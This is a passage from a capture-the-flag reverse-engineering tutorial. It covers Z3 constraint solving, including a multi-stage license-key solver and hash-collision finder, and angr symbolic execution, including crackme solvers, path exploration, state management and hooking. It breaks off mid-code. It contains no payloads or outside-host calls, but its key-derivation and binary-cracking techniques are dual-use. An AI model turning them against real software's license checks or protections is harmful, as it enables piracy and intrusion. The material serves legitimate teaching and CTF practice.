**Constraint Simplification:**

```python
from z3 import *

def simplify_constraints():
    """
    Simplify complex constraints before solving
    Improves performance on large problems
    """
    x = BitVec('x', 32)
    y = BitVec('y', 32)
    
    # Complex constraint from decompiled code
    complex_constraint = (
        ((x * 0x5bd1e995) ^ (x >> 15)) * 0x5bd1e995 == 0xdeadbeef
    )
    
    # Simplify
    simplified = simplify(complex_constraint)
    print(f"Original:   {complex_constraint}")
    print(f"Simplified: {simplified}")
    
    # Solve simplified version
    solver = Solver()
    solver.add(simplified)
    
    if solver.check() == sat:
        print(f"Solution: x = 0x{solver.model()[x].as_long():08x}")
```

**Incremental Solving:**

```python
from z3 import *

def incremental_solve():
    """
    Build up constraints incrementally
    Useful for multi-stage validation
    """
    solver = Solver()
    
    # Stage 1: Basic format constraints
    serial = [BitVec(f's{i}', 8) for i in range(16)]
    
    # Add basic constraints
    solver.push()  # Save checkpoint
    for byte in serial:
        solver.add(And(byte >= 0x30, byte <= 0x7a))  # Alphanumeric range
    
    print("Stage 1: Format constraints")
    if solver.check() == sat:
        print("  Satisfiable")
        model1 = solver.model()
    
    # Stage 2: Add checksum constraint
    solver.push()  # Save another checkpoint
    checksum = Sum([ZeroExt(24, byte) for byte in serial])
    solver.add(checksum == 0x4D0)
    
    print("Stage 2: + Checksum")
    if solver.check() == sat:
        print("  Satisfiable")
        model2 = solver.model()
    
    # Stage 3: Add complex mathematical constraint
    solver.push()
    solver.add(serial[0] ^ serial[15] == 0x5A)
    solver.add(ZeroExt(8, serial[1]) * ZeroExt(8, serial[14]) == 0x0BB8)
    
    print("Stage 3: + Mathematical constraints")
    if solver.check() == sat:
        print("  Satisfiable")
        final_model = solver.model()
        solution = ''.join(chr(final_model[byte].as_long()) for byte in serial)
        print(f"  Solution: {solution}")
    
    # Can pop() to backtrack if needed
    solver.pop()  # Back to stage 2
    solver.pop()  # Back to stage 1
```

**Optimization Problems:**

```python
from z3 import *

def solve_optimization():
    """
    Find optimal solution (not just any solution)
    Example: Maximize score while satisfying constraints
    """
    # Variables
    moves = [Int(f'move_{i}') for i in range(10)]
    
    solver = Optimize()  # Use Optimize instead of Solver
    
    # Constraints: Valid move range
    for move in moves:
        solver.add(And(move >= 0, move <= 3))
    
    # Constraint: No consecutive repeats
    for i in range(len(moves) - 1):
        solver.add(moves[i] != moves[i+1])
    
    # Constraint: Final position = target
    position = Sum(moves)
    solver.add(position == 15)
    
    # Objective: Minimize number of moves
    move_count = Sum([If(move > 0, 1, 0) for move in moves])
    solver.minimize(move_count)
    
    if solver.check() == sat:
        model = solver.model()
        solution = [model[move].as_long() for move in moves]
        print(f"Optimal moves: {solution}")
        print(f"Move count: {sum(1 for m in solution if m > 0)}")
```

### Real-World CTF Challenge Examples

**Example 1: Hash Collision Finding:**

```python
#!/usr/bin/env python3
from z3 import *

def find_hash_collision():
    """
    Find two different inputs that produce same custom hash
    Custom hash: ((x * 0x1234) ^ (x >> 7)) & 0xFFFF
    """
    x1 = BitVec('x1', 32)
    x2 = BitVec('x2', 32)
    
    solver = Solver()
    
    # Different inputs
    solver.add(x1 != x2)
    
    # Constrain to reasonable range
    solver.add(And(x1 >= 0, x1 < 0x10000))
    solver.add(And(x2 >= 0, x2 < 0x10000))
    
    # Same hash output
    hash1 = ((x1 * 0x1234) ^ LShR(x1, 7)) & 0xFFFF
    hash2 = ((x2 * 0x1234) ^ LShR(x2, 7)) & 0xFFFF
    solver.add(hash1 == hash2)
    
    if solver.check() == sat:
        model = solver.model()
        val1 = model[x1].as_long()
        val2 = model[x2].as_long()
        print(f"Collision found:")
        print(f"  Input 1: {val1} (0x{val1:04x})")
        print(f"  Input 2: {val2} (0x{val2:04x})")
        
        # Verify
        h1 = ((val1 * 0x1234) ^ (val1 >> 7)) & 0xFFFF
        h2 = ((val2 * 0x1234) ^ (val2 >> 7)) & 0xFFFF
        print(f"  Hash 1:  0x{h1:04x}")
        print(f"  Hash 2:  0x{h2:04x}")
        assert h1 == h2

find_hash_collision()
```

**Example 2: Multi-Stage License Validation:**

```python
#!/usr/bin/env python3
from z3 import *
import hashlib

def solve_multistage_license():
    """
    Solve license with multiple validation stages
    Stage 1: Format check
    Stage 2: Checksum validation
    Stage 3: Cryptographic check
    """
    
    # License format: XXXX-YYYY-ZZZZ (12 chars + 2 dashes)
    license_chars = []
    for part in range(3):
        for i in range(4):
            license_chars.append(BitVec(f'part{part}_{i}', 8))
    
    solver = Solver()
    
    # Stage 1: Character constraints (hex digits)
    for char in license_chars:
        solver.add(Or(
            And(char >= ord('0'), char <= ord('9')),
            And(char >= ord('A'), char <= ord('F'))
        ))
    
    # Stage 2: Checksum (sum of parts must equal specific value)
    part1_val = Sum([ZeroExt(24, license_chars[i]) for i in range(4)])
    part2_val = Sum([ZeroExt(24, license_chars[i]) for i in range(4, 8)])
    part3_val = Sum([ZeroExt(24, license_chars[i]) for i in range(8, 12)])
    
    solver.add(part1_val == 0x120)
    solver.add(part2_val == 0x130)
    solver.add(part3_val == 0x140)
    
    # Stage 3: Mathematical relationship between parts
    # part1[0] XOR part2[0] XOR part3[0] == 0x33
    solver.add(license_chars[0] ^ license_chars[4] ^ license_chars[8] == 0x33)
    
    # Part 2 must be reverse of Part 1 (specific bytes)
    solver.add(license_chars[4] == license_chars[3])
    solver.add(license_chars[5] == license_chars[2])
    
    print("Solving multi-stage license...")
    if solver.check() == sat:
        model = solver.model()
        
        # Extract solution
        parts = []
        for part_idx in range(3):
            part = ''.join(
                chr(model[license_chars[part_idx*4 + i]].as_long())
                for i in range(4)
            )
            parts.append(part)
        
        license_key = '-'.join(parts)
        print(f"Valid license: {license_key}")
        return license_key
    else:
        print("No solution found")
        return None

solve_multistage_license()
```

**Example 3: Binary Packing Puzzle:**

```python
#!/usr/bin/env python3
from z3 import *

def solve_packing_puzzle():
    """
    Solve binary packing puzzle
    Example: Pack items into bins with constraints
    """
    
    # 5 items with different sizes
    items = [3, 5, 7, 2, 9]
    n_items = len(items)
    n_bins = 3
    bin_capacity = 15
    
    # Decision variables: which bin does item i go into?
    assignment = [Int(f'item_{i}_bin') for i in range(n_items)]
    
    # Binary variables: is bin j used?
    bin_used = [Bool(f'bin_{j}_used') for j in range(n_bins)]
    
    solver = Optimize()
    
    # Constraint: Each item assigned to valid bin
    for i in range(n_items):
        solver.add(And(assignment[i] >= 0, assignment[i] < n_bins))
    
    # Constraint: Bin capacity not exceeded
    for j in range(n_bins):
        bin_load = Sum([
            If(assignment[i] == j, items[i], 0)
            for i in range(n_items)
        ])
        solver.add(bin_load <= bin_capacity)
        
        # Link bin usage to assignment
        solver.add(Implies(
            Or([assignment[i] == j for i in range(n_items)]),
            bin_used[j]
        ))
    
    # Objective: Minimize number of bins used
    bins_count = Sum([If(bin_used[j], 1, 0) for j in range(n_bins)])
    solver.minimize(bins_count)
    
    if solver.check() == sat:
        model = solver.model()
        
        print("Optimal packing:")
        for j in range(n_bins):
            items_in_bin = [
                i for i in range(n_items)
                if model[assignment[i]].as_long() == j
            ]
            if items_in_bin:
                total = sum(items[i] for i in items_in_bin)
                print(f"Bin {j}: items {items_in_bin} (total: {total}/{bin_capacity})")
        
        print(f"Bins used: {model.eval(bins_count)}")

solve_packing_puzzle()
```

### Performance Optimization

**Constraint Partitioning:**

```python
from z3 import *

def solve_with_partitioning():
    """
    Partition large constraint systems into smaller problems
    Solve independently when possible
    """
    # Independent groups of variables
    group1 = [BitVec(f'g1_{i}', 8) for i in range(10)]
    group2 = [BitVec(f'g2_{i}', 8) for i in range(10)]
    
    # Solve group 1 independently
    solver1 = Solver()
    for var in group1:
        solver1.add(And(var >= 0x30, var <= 0x39))
    solver1.add(Sum([ZeroExt(24, v) for v in group1]) == 0x1F4)
    
    if solver1.check() == sat:
        model1 = solver1.model()
        solution1 = [model1[v].as_long() for v in group1]
        print(f"Group 1 solved: {solution1}")
    
    # Solve group 2 independently
    solver2 = Solver()
    for var in group2:
        solver2.add(And(var >= 0x41, var <= 0x5A))
    solver2.add(Sum([ZeroExt(24, v) for v in group2]) == 0x320)
    
    if solver2.check() == sat:
        model2 = solver2.model()
        solution2 = [model2[v].as_long() for v in group2]
        print(f"Group 2 solved: {solution2}")
    
    # Combine solutions
    return solution1 + solution2
```

**Timeout and Resource Limits:**

```python
from z3 import *

def solve_with_timeout():
    """
    Set timeout and resource limits for complex problems
    """
    x = BitVec('x', 32)
    
    solver = Solver()
    solver.add(very_complex_constraint(x))
    
    # Set timeout (milliseconds)
    solver.set("timeout", 5000)  # 5 seconds
    
    # Set memory limit (megabytes)
    solver.set("max_memory", 1024)  # 1 GB
    
    result = solver.check()
    
    if result == sat:
        print("Solution found")
        print(solver.model())
    elif result == unsat:
        print("No solution exists")
    else:  # unknown
        print("Timeout or resource limit exceeded")
        print("Try simplifying constraints or increasing limits")
```

### Debugging Constraint Solving

**Unsatisfiable Core Analysis:**

```python
from z3 import *

def analyze_unsat_core():
    """
    When constraints are unsatisfiable, find minimal conflicting subset
    """
    x = Int('x')
    
    solver = Solver()
    
    # Add constraints with tracking
    c1 = x > 10
    c2 = x < 5
    c3 = x >= 0
    c4 = x <= 100
    
    solver.assert_and_track(c1, 'c1')
    solver.assert_and_track(c2, 'c2')
    solver.assert_and_track(c3, 'c3')
    solver.assert_and_track(c4, 'c4')
    
    if solver.check() == unsat:
        core = solver.unsat_core()
        print("Unsatisfiable core (conflicting constraints):")
        for constraint in core:
            print(f"  - {constraint}")
        # Output: c1 and c2 conflict (x > 10 and x < 5)

analyze_unsat_core()
```

**Solution Enumeration:**

```python
from z3 import *

def enumerate_solutions():
    """
    Find multiple solutions to constraints
    Useful when any valid solution works
    """
    x = BitVec('x', 8)
    y = BitVec('y', 8)
    
    solver = Solver()
    solver.add(x + y == 100)
    solver.add(x > 30)
    solver.add(y > 30)
    
    solutions = []
    count = 0
    max_solutions = 10
    
    while solver.check() == sat and count < max_solutions:
        model = solver.model()
        x_val = model[x].as_long()
        y_val = model[y].as_long()
        
        solutions.append((x_val, y_val))
        print(f"Solution {count + 1}: x={x_val}, y={y_val}")
        
        # Block this solution
        solver.add(Or(x != x_val, y != y_val))
        count += 1
    
    return solutions

enumerate_solutions()
```

---

### Related Topics

**Important Subtopics:**

- **Symbolic Execution Deep Dive** - Advanced angr techniques, custom SimProcedures, state merging strategies
- **SMT Theory** - Understanding underlying satisfiability modulo theories for better constraint formulation
- **Binary Obfuscation Techniques** - Dealing with packed, virtualized, or heavily obfuscated binaries
- **Side-Channel Analysis** - Timing attacks, power analysis in CTF contexts

**Advanced Techniques:**

- **Partial Evaluation** - Simplifying binaries before symbolic execution
- **Under-Constrained Symbolic Execution** - Analyzing functions in isolation
- **Binary Synthesis** - Generating programs that satisfy specifications
- **Automated Exploit Generation (AEG)** - Combining constraint solving with exploitation

---

# Advanced Angr & Symbolic Execution

## Angr Framework Setup and Fundamentals

Angr is a Python framework for binary analysis and symbolic execution, enabling automated vulnerability discovery and exploit generation.

### Installation and Dependencies

```bash
# Basic installation
pip install angr

# Development version with latest features
pip install git+https://github.com/angr/angr.git

# Additional useful tools
pip install angr-management  # GUI for angr
pip install archr            # Target interaction
pip install patcherex        # Binary patching

# Common dependencies
sudo apt-get install build-essential python3-dev libffi-dev
```

### Core Components

**Project initialization**

```python
import angr
import claripy

# Load binary
project = angr.Project('./binary', auto_load_libs=False)

# With library loading
project = angr.Project('./binary', 
                       auto_load_libs=True,
                       lib_opts={'libc.so.6': {'base_addr': 0x7ffff7a00000}})

# Architecture information
print(f"Architecture: {project.arch}")
print(f"Entry point: {hex(project.entry)}")
print(f"Main binary: {project.loader.main_object}")

# Access loaded objects
for obj in project.loader.all_objects:
    print(f"{obj.binary}: {hex(obj.min_addr)} - {hex(obj.max_addr)}")
```

**Basic symbolic execution workflow**

```python
import angr

project = angr.Project('./challenge')

# Create initial state at entry point
state = project.factory.entry_state()

# Create simulation manager
simgr = project.factory.simulation_manager(state)

# Explore until address is reached
target_addr = 0x401234
simgr.explore(find=target_addr)

# Check if target found
if simgr.found:
    found_state = simgr.found[0]
    print(f"Solution: {found_state.posix.dumps(0)}")  # stdin
else:
    print("Target not reachable")
```

### State Factory Methods

```python
# Entry state (program start)
state = project.factory.entry_state()

# Blank state (specific address, uninitialized)
state = project.factory.blank_state(addr=0x401000)

# Call state (function entry with arguments)
state = project.factory.call_state(
    addr=0x401234,
    arg1=42,
    arg2=claripy.BVS('symbolic_arg', 64)
)

# Full init state (runs through C runtime initialization)
state = project.factory.full_init_state()

# Custom entry state with arguments
argv = [project.filename]
argv.append(claripy.BVS('arg1', 8 * 100))  # Symbolic 100-byte argument
state = project.factory.entry_state(args=argv)

# With environment variables
env = {'FLAG': claripy.BVS('flag', 8 * 32)}
state = project.factory.entry_state(env=env)
```

### Symbolic Variables and Constraints

```python
import claripy

# Create symbolic bitvectors
x = claripy.BVS('x', 32)  # 32-bit symbolic value
y = claripy.BVS('y', 64)  # 64-bit symbolic value

# Create concrete values
concrete = claripy.BVV(0x1234, 32)  # 32-bit concrete value

# Operations
result = x + y
result = x * 2
result = x & 0xff
result = claripy.If(x > 10, x * 2, x + 5)  # Conditional

# Constraints
constraint1 = x > 100
constraint2 = x < 200
constraint3 = (x & 0xff) == 0x41

# Add constraints to state
state.solver.add(constraint1)
state.solver.add(constraint2)

# Check satisfiability
if state.solver.satisfiable():
    solution = state.solver.eval(x)
    print(f"x = {solution}")
    
    # Get all possible solutions (up to limit)
    solutions = state.solver.eval_upto(x, 10)
    print(f"Possible values: {solutions}")
    
    # Get min/max values
    min_val = state.solver.min(x)
    max_val = state.solver.max(x)
```

### Memory Operations

```python
# Read memory (concrete address)
value = state.memory.load(0x601000, 4)  # Read 4 bytes

# Read as integer
value_int = state.solver.eval(state.memory.load(0x601000, 4, endness='Iend_LE'))

# Write memory
state.memory.store(0x601000, claripy.BVV(0x41414141, 32))

# Write symbolic value
symbolic_val = claripy.BVS('mem_value', 32)
state.memory.store(0x601000, symbolic_val)

# Read/write with symbolic addresses [Inference]
addr = claripy.BVS('addr', 64)
state.solver.add(addr >= 0x601000)
state.solver.add(addr < 0x602000)
value = state.memory.load(addr, 4)

# Register operations
rax = state.regs.rax
state.regs.rax = claripy.BVV(42, 64)
state.regs.rip = 0x401234

# Stack operations
state.stack_push(claripy.BVV(0xdeadbeef, 64))
value = state.stack_pop()
```

### File System and I/O

```python
# Symbolic stdin
stdin_size = 100
stdin = claripy.BVS('stdin', stdin_size * 8)
state = project.factory.entry_state(stdin=stdin)

# After exploration
if simgr.found:
    solution = simgr.found[0].posix.dumps(0)  # Dump stdin
    print(f"Input: {solution}")

# Symbolic file
symbolic_file = angr.SimFile('flag.txt', size=32)
state = project.factory.entry_state(fs={'flag.txt': symbolic_file})

# After solving
flag_content = simgr.found[0].posix.dumps('flag.txt')

# Concrete file
import angr
state = project.factory.entry_state()
real_file = angr.SimFile('input.txt', content='concrete data')
state.fs.insert('input.txt', real_file)
```

### Complete Basic Example

```python
#!/usr/bin/env python3
import angr
import claripy
import sys

def solve_crackme(binary_path):
    """Basic crackme solver"""
    project = angr.Project(binary_path, auto_load_libs=False)
    
    # Create symbolic input
    flag_chars = 32
    flag = claripy.BVS('flag', flag_chars * 8)
    
    # Entry state with symbolic stdin
    state = project.factory.entry_state(stdin=flag)
    
    # Add constraints (printable ASCII)
    for byte in flag.chop(8):
        state.solver.add(byte >= 0x20)
        state.solver.add(byte <= 0x7e)
    
    # Create simulation manager
    simgr = project.factory.simulation_manager(state)
    
    # Define success/failure addresses
    success_addr = 0x401234  # "Correct!" message
    failure_addr = 0x401267  # "Wrong!" message
    
    # Explore
    simgr.explore(find=success_addr, avoid=failure_addr)
    
    # Get solution
    if simgr.found:
        found_state = simgr.found[0]
        solution = found_state.solver.eval(flag, cast_to=bytes)
        print(f"[+] Solution found: {solution}")
        return solution
    else:
        print("[-] No solution found")
        return None

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <binary>")
        sys.exit(1)
    
    solve_crackme(sys.argv[1])
```

---

## Path Exploration Strategies

Path exploration determines how angr navigates through the program's execution graph.

### Basic Exploration Techniques

```python
import angr

project = angr.Project('./binary')
state = project.factory.entry_state()
simgr = project.factory.simulation_manager(state)

# Simple exploration to address
simgr.explore(find=0x401234)

# Avoid specific addresses
simgr.explore(find=0x401234, avoid=[0x401567, 0x401890])

# Using lambda functions for complex conditions
def is_success(state):
    output = state.posix.dumps(1)  # stdout
    return b'Success' in output

def is_failure(state):
    output = state.posix.dumps(1)
    return b'Failure' in output

simgr.explore(find=is_success, avoid=is_failure)

# Exploration with step limit
simgr.explore(find=0x401234, num_find=3, n=100)  # Max 100 steps
```

### Exploration Techniques

```python
# BFS (Breadth-First Search) - Default
simgr = project.factory.simulation_manager(
    state,
    exploration_technique=angr.exploration_techniques.BFS()
)

# DFS (Depth-First Search)
simgr.use_technique(angr.exploration_techniques.DFS())

# Loop exhaustion - prevent infinite loops
simgr.use_technique(angr.exploration_techniques.LoopSeer(
    bound=5,  # Maximum loop iterations
    limit_concrete_loops=True
))

# Veritesting - smart path merging for performance
simgr.use_technique(angr.exploration_techniques.Veritesting())

# Threading for parallel exploration
simgr.use_technique(angr.exploration_techniques.Threading(threads=4))

# Memory management for large state spaces
simgr.use_technique(angr.exploration_techniques.MemoryWatcher(
    min_memory=1024 * 1024 * 1024  # 1GB minimum
))
```

### Custom Exploration Technique

```python
from angr.exploration_techniques import ExplorationTechnique

class CustomExplorer(ExplorationTechnique):
    def __init__(self, target_addr):
        super().__init__()
        self.target_addr = target_addr
        self.iteration = 0
    
    def step(self, simgr, stash='active', **kwargs):
        """Called at each exploration step"""
        self.iteration += 1
        
        # Log progress
        if self.iteration % 100 == 0:
            print(f"[*] Iteration {self.iteration}, Active: {len(simgr.active)}")
        
        # Custom logic: prioritize states near target
        if simgr.active:
            simgr.active.sort(key=lambda s: abs(s.addr - self.target_addr))
        
        # Continue normal stepping
        simgr = simgr.step(stash=stash, **kwargs)
        
        return simgr
    
    def complete(self, simgr):
        """Called when exploration completes"""
        print(f"[*] Exploration complete after {self.iteration} iterations")
        return simgr

# Usage
simgr = project.factory.simulation_manager(state)
simgr.use_technique(CustomExplorer(target_addr=0x401234))
simgr.run()
```

### Stash Management

```python
# Stashes are collections of states
# Default stashes: active, deadended, found, avoid, errored

# Move states between stashes
simgr.move(from_stash='active', to_stash='deferred', 
           filter_func=lambda s: s.addr == 0x401234)

# Custom stash operations
simgr.split(from_stash='active', 
            limit=10,  # Keep 10 in active
            to_stash='deferred')  # Rest to deferred

# Merge states in stash [Inference]
simgr.merge(stash='active')

# Drop states
simgr.drop(stash='deadended')

# Manual stash iteration
for state in simgr.active:
    if state.addr == 0x401234:
        print(f"Found state at target: {state}")
        simgr.move(from_stash='active', to_stash='found',
                   filter_func=lambda s: s is state)
```

### Advanced Exploration Patterns

```python
#!/usr/bin/env python3
import angr
import claripy

class MultiTargetExplorer:
    """Explore multiple targets efficiently"""
    
    def __init__(self, project, targets):
        self.project = project
        self.targets = targets
        self.solutions = {}
    
    def explore(self):
        state = self.project.factory.entry_state(
            stdin=claripy.BVS('input', 8 * 100)
        )
        
        simgr = self.project.factory.simulation_manager(state)
        
        # Custom exploration to find all targets
        while simgr.active and len(self.solutions) < len(self.targets):
            simgr.step()
            
            # Check for targets
            for state in simgr.active:
                if state.addr in self.targets and state.addr not in self.solutions:
                    print(f"[+] Found target: {hex(state.addr)}")
                    
                    # Clone state and save solution
                    solution_state = state.copy()
                    self.solutions[state.addr] = solution_state
            
            # Remove found states from active
            simgr.active = [s for s in simgr.active 
                           if s.addr not in self.solutions]
            
            print(f"[*] Active: {len(simgr.active)}, Found: {len(self.solutions)}")
        
        return self.solutions
    
    def print_solutions(self):
        for addr, state in self.solutions.items():
            solution = state.solver.eval(state.posix.stdin.load(0, 100), 
                                        cast_to=bytes)
            print(f"{hex(addr)}: {solution}")

# Usage
project = angr.Project('./multi_target')
explorer = MultiTargetExplorer(project, [0x401234, 0x401567, 0x401890])
explorer.explore()
explorer.print_solutions()
```

### Lazy Solving and State Pruning

```python
#!/usr/bin/env python3
import angr

class EfficientExplorer:
    """Optimized exploration with state pruning"""
    
    def __init__(self, project):
        self.project = project
        self.seen_states = set()
    
    def should_prune(self, state):
        """[Inference] Decide if state should be pruned"""
        # Prune if we've seen similar state
        state_hash = (state.addr, state.regs.rsp.args[0])
        
        if state_hash in self.seen_states:
            return True
        
        self.seen_states.add(state_hash)
        return False
    
    def explore_pruned(self, find_addr, avoid_addrs=[]):
        state = self.project.factory.entry_state(
            stdin=angr.storage.SimFile('/dev/stdin', size=100)
        )
        
        simgr = self.project.factory.simulation_manager(state)
        simgr.use_technique(angr.exploration_techniques.DFS())
        
        step_count = 0
        while simgr.active:
            step_count += 1
            simgr.step()
            
            # Prune states
            pruned = []
            for state in simgr.active:
                if state.addr in avoid_addrs:
                    continue
                if self.should_prune(state):
                    pruned.append(state)
                elif state.addr == find_addr:
                    return state
            
            # Remove pruned states
            for state in pruned:
                simgr.active.remove(state)
            
            if step_count % 50 == 0:
                print(f"[*] Steps: {step_count}, Active: {len(simgr.active)}, "
                      f"Seen: {len(self.seen_states)}")
        
        return None

# Usage
project = angr.Project('./binary')
explorer = EfficientExplorer(project)
found_state = explorer.explore_pruned(find_addr=0x401234)
```

### Concolic Execution Integration

```python
#!/usr/bin/env python3
import angr
import claripy

def concolic_exploration(binary_path, concrete_input):
    """[Inference] Mix concrete and symbolic execution"""
    project = angr.Project(binary_path)
    
    # Start with concrete input
    state = project.factory.entry_state(stdin=concrete_input)
    
    # Make specific parts symbolic
    symbolic_offset = 10
    symbolic_length = 20
    
    # Replace part of input with symbolic data
    symbolic_data = claripy.BVS('symbolic_part', symbolic_length * 8)
    state.posix.stdin.seek(symbolic_offset)
    state.posix.stdin.write(symbolic_data, symbolic_length)
    state.posix.stdin.seek(0)
    
    # Explore
    simgr = project.factory.simulation_manager(state)
    simgr.explore(find=lambda s: b'Success' in s.posix.dumps(1))
    
    if simgr.found:
        solution = simgr.found[0].solver.eval(symbolic_data, cast_to=bytes)
        
        # Reconstruct full input
        full_input = concrete_input[:symbolic_offset] + solution + \
                     concrete_input[symbolic_offset + symbolic_length:]
        
        return full_input
    
    return None
```

---

## State Management

Effective state management is crucial for scalable symbolic execution.

### State Inspection and Modification

```python
import angr

project = angr.Project('./binary')
state = project.factory.entry_state()

# Basic state information
print(f"Address: {hex(state.addr)}")
print(f"Stack pointer: {hex(state.solver.eval(state.regs.rsp))}")
print(f"Instruction pointer: {hex(state.solver.eval(state.regs.rip))}")

# History tracking
state.history.jumpkind  # Type of last jump
state.history.addr  # Address of last instruction
state.history.jump_target  # Target of last jump

# Access parent states
if state.history.parent:
    parent = state.history.parent
    print(f"Parent address: {hex(parent.addr)}")

# State options
state.options.add(angr.options.LAZY_SOLVES)  # Delay constraint solving
state.options.add(angr.options.SIMPLIFY_MEMORY_WRITES)
state.options.add(angr.options.SIMPLIFY_REGISTER_WRITES)

# Disable options
state.options.discard(angr.options.SYMBOLIC_WRITE_ADDRESSES)
```

### State Copying and Branching

```python
# Deep copy state
new_state = state.copy()

# Modify without affecting original
new_state.regs.rax = 42
print(f"Original RAX: {state.solver.eval(state.regs.rax)}")
print(f"New RAX: {new_state.solver.eval(new_state.regs.rax)}")

# Manual state branching
def manual_branch(state, condition):
    """Branch state based on condition"""
    # True branch
    true_state = state.copy()
    true_state.solver.add(condition)
    
    # False branch
    false_state = state.copy()
    false_state.solver.add(claripy.Not(condition))
    
    # Check satisfiability
    branches = []
    if true_state.solver.satisfiable():
        branches.append(('true', true_state))
    if false_state.solver.satisfiable():
        branches.append(('false', false_state))
    
    return branches

# Usage
x = state.solver.BVS('x', 32)
branches = manual_branch(state, x > 100)
for branch_type, branch_state in branches:
    print(f"{branch_type} branch satisfiable")
```

### State Merging

```python
#!/usr/bin/env python3
import angr

def merge_states_example(project):
    """[Inference] Demonstrate state merging for efficiency"""
    state1 = project.factory.blank_state(addr=0x401234)
    state2 = project.factory.blank_state(addr=0x401234)
    
    # Different values in registers
    state1.regs.rax = 100
    state2.regs.rax = 200
    
    # Merge states
    merged_state, merge_flag, merging_occurred = state1.merge(state2)
    
    if merging_occurred:
        # RAX is now symbolic in merged state
        rax_value = merged_state.regs.rax
        
        # Can evaluate both possibilities
        possible_values = merged_state.solver.eval_upto(rax_value, 10)
        print(f"Possible RAX values: {possible_values}")
        
        # Merge flag tracks which original state we came from
        print(f"Merge flag: {merge_flag}")
    
    return merged_state

# Automatic merging in simulation manager
state = project.factory.entry_state()
simgr = project.factory.simulation_manager(state)

# Enable automatic state merging
simgr.use_technique(angr.exploration_techniques.Veritesting())

# Or manual merge
simgr.step()
if len(simgr.active) > 10:
    # Merge similar states
    simgr.merge(stash='active')
```

### State Plugins and Storage

```python
# Custom state plugin for tracking data
class CustomTracking(angr.SimStatePlugin):
    def __init__(self):
        super().__init__()
        self.tracked_values = []
    
    def copy(self, memo):
        """Required for state copying"""
        c = CustomTracking()
        c.tracked_values = list(self.tracked_values)
        return c
    
    def merge(self, others, merge_conditions, common_ancestor=None):
        """Required for state merging"""
        # Merge tracking data from other states
        for other in others:
            self.tracked_values.extend(other.tracked_values)
        return True
    
    def track(self, value):
        self.tracked_values.append(value)

# Register plugin
state.register_plugin('custom_tracking', CustomTracking())

# Use plugin
state.custom_tracking.track(42)
state.custom_tracking.track(state.regs.rax)

# Plugin persists through copies
new_state = state.copy()
print(new_state.custom_tracking.tracked_values)
```

### Memory Management and Optimization

```python
#!/usr/bin/env python3
import angr

# State options for performance
optimized_state = project.factory.entry_state(
    add_options={
        angr.options.LAZY_SOLVES,  # Defer solving
        angr.options.SIMPLIFY_MEMORY_READS,
        angr.options.SIMPLIFY_MEMORY_WRITES,
        angr.options.SIMPLIFY_REGISTER_READS,
        angr.options.SIMPLIFY_REGISTER_WRITES,
        angr.options.SIMPLIFY_EXPRS,  # Simplify symbolic expressions
    },
    remove_options={
        angr.options.SUPPORT_FLOATING_POINT,  # If not needed
        angr.options.TRACK_ACTION_HISTORY,  # Reduce memory usage
    }
)

# Memory backing store configuration
state.memory.mem._memory_backer = None  # Don't keep concrete memory copy

# State preconstraining
state.solver.add(state.regs.rdi > 0)
state.solver.add(state.regs.rdi < 1000)
state.solver.simplify()  # Simplify constraint set
```

### State Serialization

```python
import pickle
import angr

# Save state to disk
def save_state(state, filename):
    """[Unverified] State serialization may have limitations"""
    with open(filename, 'wb') as f:
        pickle.dump(state, f)

# Load state from disk
def load_state(filename):
    with open(filename, 'rb') as f:
        return pickle.load(f)

# Usage
save_state(state, 'checkpoint.pkl')

# Later...
restored_state = load_state('checkpoint.pkl')
simgr = project.factory.simulation_manager(restored_state)
simgr.explore(find=0x401234)
```

### State Inspection Tools

```python
#!/usr/bin/env python3
import angr
import claripy

class StateInspector:
    """Advanced state inspection utilities"""
    
    def __init__(self, state):
        self.state = state
    
    def dump_registers(self):
        """Dump all general-purpose registers"""
        if self.state.arch.name == 'AMD64':
            regs = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi', 
                   'rbp', 'rsp', 'r8', 'r9', 'r10', 'r11', 
                   'r12', 'r13', 'r14', 'r15', 'rip']
        elif self.state.arch.name == 'X86':
            regs = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi', 
                   'ebp', 'esp', 'eip']
        else:
            return "Unsupported architecture"
        
        result = []
        for reg in regs:
            value = getattr(self.state.regs, reg)
            if self.state.solver.symbolic(value):
                result.append(f"{reg}: <symbolic>")
            else:
                concrete = self.state.solver.eval(value)
                result.append(f"{reg}: {hex(concrete)}")
        
        return '\n'.join(result)
    
    def dump_stack(self, num_words=20):
        """Dump stack contents"""
        rsp = self.state.solver.eval(self.state.regs.rsp)
        word_size = self.state.arch.bytes
        
        result = []
        for i in range(num_words):
            addr = rsp + i * word_size
            try:
                value = self.state.memory.load(addr, word_size, endness='Iend_LE')
                
                if self.state.solver.symbolic(value):
                    result.append(f"{hex(addr)}: <symbolic>")
                else:
                    concrete = self.state.solver.eval(value)
                    result.append(f"{hex(addr)}: {hex(concrete)}")
            except:
                result.append(f"{hex(addr)}: <unmapped>")
        
        return '\n'.join(result)
    
    def find_symbolic_data(self):
        """Find all symbolic data in state"""
        symbolic_items = []
        
        # Check registers
        for reg in self.state.arch.register_names.values():
            try:
                value = self.state.registers.load(reg)
                if self.state.solver.symbolic(value):
                    symbolic_items.append(('register', reg, value))
            except:
                pass
        
        # Check stdin
        if hasattr(self.state.posix, 'stdin'):
            stdin_data = self.state.posix.stdin.content
            if self.state.solver.symbolic(stdin_data):
                symbolic_items.append(('stdin', None, stdin_data))
        
        return symbolic_items
    
    def constraints_summary(self):
        """Summarize constraints on state"""
        constraints = self.state.solver.constraints
        
        print(f"Total constraints: {len(constraints)}")
        print(f"Satisfiable: {self.state.solver.satisfiable()}")
        
        # Get variables
        variables = set()
        for constraint in constraints:
            variables.update(constraint.variables)
        
        print(f"Symbolic variables: {variables}")
        
        return constraints

# Usage
inspector = StateInspector(state)
print(inspector.dump_registers())
print("\n" + inspector.dump_stack())
inspector.constraints_summary()
```

---

## Hooking Functions

Function hooking allows custom behavior to be injected during symbolic execution.

### Basic Function Hooking

```python
import angr

project = angr.Project('./binary')

# Hook function by address
@project.hook(0x401234)
def custom_hook(state):
    """Replace function at 0x401234"""
    print(f"[*] Hooked at {hex(state.addr)}")
    
    # Read arguments (x86-64 calling convention)
    arg1 = state.regs.rdi
    arg2 = state.regs.rsi
    
    # Custom logic
    result = arg1 + arg2
    
    # Set return value
    state.regs.rax = result
    
    # Return to caller
    return

# Hook by symbol name
@project.hook_symbol('strcmp')
def strcmp_hook(state):
